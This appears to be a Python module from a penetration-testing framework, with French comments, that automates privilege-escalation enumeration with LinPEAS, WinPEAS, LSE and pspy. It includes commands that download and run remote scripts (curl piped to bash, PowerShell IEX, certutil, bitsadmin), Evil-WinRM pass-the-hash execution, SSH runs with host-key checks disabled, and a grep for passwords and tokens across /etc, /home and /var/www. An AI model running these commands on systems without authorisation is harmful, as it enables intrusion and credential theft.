"""
PEAS Module (LinPEAS / WinPEAS)
===============================
Énumération locale pour élévation de privilèges
"""

from typing import Dict, Any, List, Optional
from datetime import datetime
from core.executor import CommandExecutor, escape_shell_arg
import os
import re


class PEASModule:
    """
    Module pour LinPEAS et WinPEAS
    - Énumération système complète
    - Détection de misconfigurations
    - Recherche de credentials
    - Identification des vecteurs privesc
    """
    
    def __init__(self):
        self.executor = CommandExecutor()
        self.output_dir = "/tmp/peas_output"
        os.makedirs(self.output_dir, exist_ok=True)
        
        # URLs des scripts PEAS
        self.linpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
        self.winpeas_url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
    
    async def linpeas_local(self, target: str = "localhost", options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécute LinPEAS localement
        """
        options = options or {}
        
        output_file = f"{self.output_dir}/linpeas_{int(datetime.now().timestamp())}.txt"
        
        # Options LinPEAS
        flags = ""
        if options.get("fast", False):
            flags += " -a"  # All checks
        if options.get("quiet", False):
            flags += " -q"
        if options.get("superfast", False):
            flags += " -s"
        
        # Télécharger et exécuter ou utiliser la version locale
        linpeas_path = options.get("linpeas_path")
        if linpeas_path and os.path.exists(linpeas_path):
            cmd = f"bash {escape_shell_arg(linpeas_path)} {flags} | tee {output_file}"
        else:
            cmd = f"curl -sL {self.linpeas_url} | bash -s -- {flags} | tee {output_file}"
        
        result = await self.executor.run(cmd, timeout=1200)  # 20 minutes max
        
        # Parser les résultats pour les points critiques
        findings = self._parse_linpeas_output(result.stdout)
        
        return {
            "action": "linpeas",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "output_file": output_file,
                "findings": findings,
                "critical_count": sum(1 for f in findings if f.get("severity") == "critical"),
                "high_count": sum(1 for f in findings if f.get("severity") == "high")
            }
        }
    
    async def linpeas_remote(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécute LinPEAS sur une cible distante via SSH
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        
        username = options.get("username", "")
        password = options.get("password", "")
        key_file = options.get("key_file", "")
        port = options.get("port", 22)
        
        output_file = f"{self.output_dir}/linpeas_{target.replace('.', '_')}_{int(datetime.now().timestamp())}.txt"
        
        # Construire la commande SSH
        ssh_opts = f"-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p {port}"
        
        if key_file:
            ssh_cmd = f"ssh {ssh_opts} -i {escape_shell_arg(key_file)} {escape_shell_arg(username)}@{target_safe}"
        elif password:
            ssh_cmd = f"sshpass -p {escape_shell_arg(password)} ssh {ssh_opts} {escape_shell_arg(username)}@{target_safe}"
        else:
            ssh_cmd = f"ssh {ssh_opts} {escape_shell_arg(username)}@{target_safe}"
        
        # Exécuter LinPEAS à distance
        cmd = f"{ssh_cmd} 'curl -sL {self.linpeas_url} | bash' | tee {output_file}"
        
        result = await self.executor.run(cmd, timeout=1200)
        
        findings = self._parse_linpeas_output(result.stdout)
        
        return {
            "action": "linpeas_remote",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(password, "****") if password else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "output_file": output_file,
                "findings": findings
            }
        }
    
    async def winpeas_generate_command(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Génère les commandes pour exécuter WinPEAS sur Windows
        """
        options = options or {}
        
        # Options WinPEAS
        checks = options.get("checks", "")  # systeminfo, userinfo, processinfo, servicesinfo, etc.
        
        # Différentes méthodes d'exécution
        methods = {
            "download_execute": f"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('{self.winpeas_url}')\"",
            "certutil": f"certutil -urlcache -split -f {self.winpeas_url} C:\\Windows\\Temp\\winpeas.exe && C:\\Windows\\Temp\\winpeas.exe {checks}",
            "curl": f"curl {self.winpeas_url} -o C:\\Windows\\Temp\\winpeas.exe && C:\\Windows\\Temp\\winpeas.exe {checks}",
            "bitsadmin": f"bitsadmin /transfer n {self.winpeas_url} C:\\Windows\\Temp\\winpeas.exe && C:\\Windows\\Temp\\winpeas.exe {checks}"
        }
        
        return {
            "action": "winpeas_command",
            "target": target,
            "status": "info",
            "output": "Commandes WinPEAS générées",
            "timestamp": datetime.now().isoformat(),
            "parsed_data": {
                "methods": methods,
                "download_url": self.winpeas_url,
                "checks": checks,
                "instructions": [
                    "1. Utilisez une des méthodes ci-dessus via Evil-WinRM/PsExec",
                    "2. Ou transférez winpeas.exe manuellement",
                    "3. Exécutez avec les options souhaitées",
                    "4. Récupérez la sortie pour analyse"
                ]
            }
        }
    
    async def winpeas_via_evilwinrm(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécute WinPEAS via Evil-WinRM
        """
        options = options or {}
        target_safe = escape_shell_arg(target)
        
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        
        output_file = f"{self.output_dir}/winpeas_{target.replace('.', '_')}_{int(datetime.now().timestamp())}.txt"
        
        # Construire la commande Evil-WinRM
        base_cmd = f"evil-winrm -i {target_safe} -u {escape_shell_arg(username)}"
        
        if password:
            base_cmd += f" -p {escape_shell_arg(password)}"
        elif hash_val:
            base_cmd += f" -H {escape_shell_arg(hash_val)}"
        
        # Télécharger et exécuter WinPEAS
        ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
        
        cmd = f"echo \"{ps_cmd}\" | {base_cmd} | tee {output_file}"
        
        result = await self.executor.run(cmd, timeout=1200)
        
        findings = self._parse_winpeas_output(result.stdout)
        
        return {
            "action": "winpeas",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": base_cmd.replace(password, "****") if password else base_cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "output_file": output_file,
                "findings": findings
            }
        }
    
    async def lse(self, target: str = "localhost", options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Linux Smart Enumeration (alternative à LinPEAS)
        """
        options = options or {}
        
        output_file = f"{self.output_dir}/lse_{int(datetime.now().timestamp())}.txt"
        level = options.get("level", 1)  # 0, 1, 2
        
        lse_url = "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh"
        
        cmd = f"curl -sL {lse_url} | bash -s -- -l {level} | tee {output_file}"
        
        result = await self.executor.run(cmd, timeout=600)
        
        return {
            "action": "lse",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "output_file": output_file,
                "level": level
            }
        }
    
    async def pspy(self, target: str = "localhost", options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Surveillance des processus avec pspy
        Utile pour détecter les cron jobs et processus temporaires
        """
        options = options or {}
        
        output_file = f"{self.output_dir}/pspy_{int(datetime.now().timestamp())}.txt"
        duration = options.get("duration", 60)  # Durée de surveillance en secondes
        
        pspy_url = "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
        
        cmd = f"timeout {duration} bash -c 'curl -sL {pspy_url} -o /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy' | tee {output_file}"
        
        result = await self.executor.run(cmd, timeout=duration + 30)
        
        # Parser les processus intéressants
        processes = self._parse_pspy_output(result.stdout)
        
        return {
            "action": "pspy",
            "target": target,
            "status": "completed",
            "command": cmd,
            "output": result.stdout,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "output_file": output_file,
                "monitoring_duration": duration,
                "interesting_processes": processes
            }
        }
    
    async def suid_search(self, target: str = "localhost", options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Recherche de binaires SUID/SGID potentiellement exploitables
        """
        options = options or {}
        
        # Recherche SUID
        cmd = "find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -la {} \\; 2>/dev/null"
        
        result = await self.executor.run(cmd, timeout=120)
        
        # Parser et identifier les binaires intéressants
        suid_binaries = self._parse_suid_binaries(result.stdout)
        
        return {
            "action": "suid_search",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "suid_binaries": suid_binaries,
                "count": len(suid_binaries),
                "exploitable": [b for b in suid_binaries if b.get("exploitable")]
            }
        }
    
    async def creds_search(self, target: str = "localhost", options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Recherche de credentials dans les fichiers
        """
        options = options or {}
        
        output_file = f"{self.output_dir}/creds_{int(datetime.now().timestamp())}.txt"
        
        # Recherche de mots de passe dans les fichiers de config
        search_patterns = [
            "password",
            "passwd",
            "pwd",
            "secret",
            "api_key",
            "apikey",
            "token"
        ]
        
        pattern = "|".join(search_patterns)
        
        # Rechercher dans les fichiers courants
        cmd = f"""
grep -rniE '({pattern})' /etc /home /var/www /opt 2>/dev/null | head -500 | tee {output_file}
"""
        
        result = await self.executor.run(cmd, timeout=300)
        
        # Parser les credentials potentiels
        potential_creds = self._parse_credential_search(result.stdout)
        
        return {
            "action": "creds_search",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": "grep credentials search",
            "output": result.stdout,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "output_file": output_file,
                "potential_credentials": potential_creds,
                "findings_count": len(potential_creds)
            }
        }
    
    # =========================================================================
    # Parsers
    # =========================================================================
    
    def _parse_linpeas_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse la sortie de LinPEAS pour les findings critiques"""
        findings = []
        
        # Patterns pour les findings critiques
        critical_patterns = [
            (r"95%.*PE.*CVE", "critical", "CVE potentiellement exploitable"),
            (r"SUID.*\/(bash|sh|python|perl|ruby|php)", "critical", "SUID sur interpréteur"),
            (r"sudo.*NOPASSWD", "high", "Sudo sans mot de passe"),
            (r"Writable.*\/etc\/passwd", "critical", "Fichier passwd modifiable"),
            (r"\.ssh.*id_rsa", "high", "Clé SSH privée trouvée"),
            (r"password.*=", "medium", "Password en clair trouvé"),
            (r"mysql.*password", "medium", "Credentials MySQL"),
            (r"docker.*sock", "high", "Socket Docker accessible"),
            (r"cap_setuid", "high", "Capability dangereuse")
        ]
        
        for line in output.split('\n'):
            for pattern, severity, description in critical_patterns:
                if re.search(pattern, line, re.I):
                    findings.append({
                        "line": line.strip()[:200],
                        "severity": severity,
                        "description": description
                    })
                    break
        
        return findings
    
    def _parse_winpeas_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse la sortie de WinPEAS"""
        findings = []
        
        critical_patterns = [
            (r"AlwaysInstallElevated", "critical", "AlwaysInstallElevated activé"),
            (r"Unquoted.*Service", "high", "Service avec chemin non-quoté"),
            (r"Modifiable.*Service", "high", "Service modifiable"),
            (r"SeImpersonate", "high", "Privilege SeImpersonate"),
            (r"AutoLogon.*password", "high", "AutoLogon avec password"),
            (r"DPAPI.*masterkey", "medium", "DPAPI masterkey"),
            (r"Cached.*GPP.*Password", "critical", "Password GPP cached")
        ]
        
        for line in output.split('\n'):
            for pattern, severity, description in critical_patterns:
                if re.search(pattern, line, re.I):
                    findings.append({
                        "line": line.strip()[:200],
                        "severity": severity,
                        "description": description
                    })
                    break
        
        return findings
    
    def _parse_pspy_output(self, output: str) -> List[Dict[str, str]]:
        """Parse la sortie de pspy"""
        processes = []
        interesting_users = ['root', 'www-data', 'mysql']
        
        for line in output.split('\n'):
            if 'CMD:' in line:
                for user in interesting_users:
                    if user in line.lower():
                        processes.append({
                            "line": line.strip(),
                            "user": user
                        })
                        break
        
        return processes[:50]  # Limiter
    
    def _parse_suid_binaries(self, output: str) -> List[Dict[str, Any]]:
        """Parse les binaires SUID"""
        binaries = []
        
        # Binaires connus pour être exploitables (GTFOBins)
        exploitable = ['nmap', 'vim', 'vi', 'nano', 'less', 'more', 'find', 
                       'bash', 'sh', 'python', 'python3', 'perl', 'ruby', 'php',
                       'awk', 'gawk', 'env', 'strace', 'ltrace', 'gdb', 'docker',
                       'systemctl', 'journalctl', 'pkexec']
        
        for line in output.split('\n'):
            if line.strip():
                parts = line.split()
                if len(parts) >= 9:
                    binary_path = parts[-1]
                    binary_name = os.path.basename(binary_path)
                    
                    binaries.append({
                        "path": binary_path,
                        "name": binary_name,
                        "permissions": parts[0],
                        "owner": parts[2],
                        "group": parts[3],
                        "exploitable": binary_name in exploitable
                    })
        
        return binaries
    
    def _parse_credential_search(self, output: str) -> List[Dict[str, str]]:
        """Parse les résultats de recherche de credentials"""
        creds = []
        
        for line in output.split('\n'):
            if line.strip() and ':' in line:
                parts = line.split(':', 1)
                if len(parts) >= 2:
                    creds.append({
                        "file": parts[0],
                        "content": parts[1].strip()[:100]
                    })
        
        return creds[:100]  # Limiter
